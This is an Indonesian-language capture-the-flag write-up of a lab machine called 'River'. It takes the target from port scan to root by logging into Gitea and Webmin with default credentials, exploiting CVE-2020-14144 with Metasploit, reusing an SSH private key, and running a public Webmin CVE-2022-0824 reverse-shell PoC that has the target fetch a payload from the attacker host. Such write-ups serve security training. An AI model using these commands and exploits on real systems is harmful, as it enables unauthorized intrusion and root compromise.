# River — HackTrace Writeup

| Field          | Detail             |
| -------------- | ------------------ |
| **IP**         | 10.1.2.144         |
| **OS**         | Linux              |
| **Difficulty** | Easy               |
| **Author**     | easygoing          |


> _"The dream is always it looks far and the distance feels unreachable stones underfoot"_

---

## 8. Summary

|Langkah|Teknik|Detail|
|---|---|---|
|Recon|Port Scan|Rustscan menemukan port 22, 80, 3000|
|Enumeration|Web Browsing|Gitea 1.12.5, 2 user ditemukan|
|Foothold|Default Credentials|`askira:askira` berhasil login Gitea|
|Initial Access|CVE-2020-14144|Gitea Git Hooks RCE via Metasploit|
|User Flag|File Read|`/home/git/user.txt`|
|Lateral Movement|SSH Key Abuse|Copy `id_rsa` + tambah ke `authorized_keys`|
|Privilege Escalation|CVE-2022-0824|Webmin File Manager RCE sebagai root|
|Root Flag|File Read|`/root/root.txt`|

### Lesson Learned

- **Default credentials** di dua service berbeda (Gitea & Webmin) menjadi kunci utama eksploitasi.
- Gitea versi lama dengan `DISABLE_GIT_HOOKS=false` adalah vektor RCE yang powerful.
- Webmin yang berjalan sebagai **root** dengan default credentials adalah misconfiguration kritis.
- **SSH key reuse** memungkinkan lateral movement tanpa perlu crack password.
- Ketika exploit gagal karena konflik nama file, debug sederhana (mengganti `fname`) adalah solusinya.)

---

## 1. Reconnaissance

Port scan dilakukan menggunakan **Rustscan** dengan flag aggressive scan:

```bash
rustscan -a 10.1.2.144 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Hasil:**

```
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
3000/tcp open  ppp?
```

Tiga port terbuka ditemukan:

- **Port 22**  - SSH (OpenSSH 9.2p1)
- **Port 80** - HTTP (Apache 2.4.56)
- **Port 3000** - Unknown (kemudian teridentifikasi sebagai Gitea)

---

## 2. Enumeration

### Port 80 - Apache Default Page

Mengakses `http://10.1.2.144` menampilkan halaman default Apache2 Debian. Feroxbuster dijalankan namun tidak menemukan konten yang berarti selain direktori `/manual`.

### Port 3000 - Gitea

Mengakses `http://10.1.2.144:3000` mengungkap instance **Gitea versi 1.12.5**.

Dari eksplorasi halaman publik ditemukan dua akun terdaftar:

- `askira` ([askira@mail.com](mailto:askira@mail.com)) — bergabung 22 Maret 2023
- `lelah` ([lelah@kk.c](mailto:lelah@kk.c)) — bergabung 25 Maret 2023

Kedua user tidak memiliki repositori publik. Brute force SSH dengan wordlist umum tidak menghasilkan kredensial valid.

### Default Credentials

Percobaan login ke Gitea dengan kredensial default:

```
Username: askira
Password: askira
```

Login berhasil. Akun `askira` memiliki akses penuh untuk membuat repositori.

---

## 3. Initial Access - CVE-2020-14144

**Vulnerability:** Gitea Git Hooks Remote Code Execution (Authenticated)  
**Affected Version:** Gitea 1.1.0 – 1.12.5  
**CVE:** [CVE-2020-14144](https://www.exploit-db.com/exploits/49571)

Gitea versi 1.12.5 memungkinkan user yang sudah terautentikasi untuk mengeksekusi arbitrary command di server melalui fitur **git hooks**. Hook yang dieksekusi setiap kali terjadi git push dapat diisi dengan payload reverse shell.

**Eksploitasi menggunakan Metasploit:**

```bash
msfconsole
use exploit/multi/http/gitea_git_hooks_rce
set RHOSTS 10.1.2.144
set RPORT 3000
set USERNAME askira
set PASSWORD askira
set LHOST <attacker_ip>
run
```

**Hasil:**

```
[+] The target appears to be vulnerable. Gitea version is 1.12.5
[*] Authenticate with "askira/askira"
[+] Logged in
[*] Create repository "Keylex_Domainer"
[+] Repository created
[*] Setup post-receive hook with command
[+] Git hook setup
[+] File created, shell incoming...
[*] Meterpreter session 1 opened
```

Meterpreter session berhasil dibuka sebagai user **`git`**.

---

## 4. User Flag


```bash
cat /home/git/user.txt
```

```
7ab89eceb5***
```

---

## 5. Lateral Movement — SSH via Git Key

Dari shell meterpreter, ditemukan SSH private key milik user `git`:


```bash
ls -la ~/.ssh/
# -rw------- 1 git git 2590 Mar 25 2023 id_rsa
# -rw-r--r-- 1 git git  563 Mar 25 2023 id_rsa.pub
```

Private key tidak memiliki passphrase. Untuk mengaktifkan login SSH, public key ditambahkan ke `authorized_keys`:

```bash
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Private key di-copy ke mesin attacker, kemudian digunakan untuk login SSH:

```bash
chmod 600 id_rsa
ssh -i id_rsa git@10.1.2.144
```

SSH session stabil berhasil diperoleh sebagai user `git`.

---

## 6. Privilege Escalation — CVE-2022-0824

### Enumerasi Internal

Dari dalam mesin, ditemukan service Webmin berjalan sebagai **root**:

```bash
ps aux | grep webmin
# root 891 ... /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
```

Port 10000 terbuka di semua interface:

```bash
netstat -tulpn | grep 10000
# tcp 0 0 0.0.0.0:10000 0.0.0.0:* LISTEN
```

Versi Webmin dikonfirmasi dari response header dan file versi:

```bash
cat /etc/webmin/version
# 1.984
```

### Akses Webmin

Login ke Webmin menggunakan **default credentials**:

```
Username: admin
Password: admin
```

Login berhasil. Panel admin Webmin dapat diakses melalui SSH port forward:

```bash
ssh -i id_rsa -L 10000:127.0.0.1:10000 git@10.1.2.144 -N
```

### Eksploitasi CVE-2022-0824

**Vulnerability:** Webmin File Manager Improper Access Control - Authenticated RCE  
**Affected Version:** Webmin 1.900 – 1.984  
**CVE:** [CVE-2022-0824](https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell)

Bug terdapat pada modul File Manager yang menggunakan tema Authentic. User yang sudah terautentikasi (bahkan low-privilege) dapat menggunakan fitur "Download from remote URL" dan "chmod" untuk mengupload file `.cgi` berbahaya, mengubah permission-nya menjadi executable, lalu mentrigger eksekusinya - semuanya berjalan dengan privilege **root**.

**Clone PoC:**

```bash
git clone https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell
cd Webmin-CVE-2022-0824-revshell
```

**Modifikasi script** - ubah nama file payload untuk menghindari konflik:

```python
# Webmin-revshell.py
fname = "gweed.cgi"
```

**Setup listener:**

```bash
nc -lvnp 4444
```

**Eksekusi exploit:**

```bash
python3 Webmin-revshell.py \
  -t https://127.0.0.1:10000 \
  -c admin:admin \
  -LS 10.18.200.142:8000 \
  -L 10.18.200.142 \
  -P 4444
```

**Hasil:**

```
[+] Generating payload to gweed.cgi in current directory
[+] Login Successful
[+] Attempt to host http.server on 8000
[+] Sleep 3 second to ensure http server is up!
Serving HTTP on 0.0.0.0 port 8000 ...
10.1.2.144 - - [23/Jul/2026 22:06:27] "GET /gweed.cgi HTTP/1.0" 200 -
[+] Fetching gweed.cgi from http.server 10.18.200.142:8000
[+] Modifying permission of gweed.cgi to 0755
[+] Success: shell spawned to 10.18.200.142 via port 4444 - XD
[+] Shell location: https://127.0.0.1:10000/gweed.cgi
[+] Cleaning up
[+] Killing: http.server on port 8000
```

Reverse shell diterima sebagai **root**.

---

## 7. Root Flag

```bash
cat /root/root.txt
```

```
82b92566e76***
```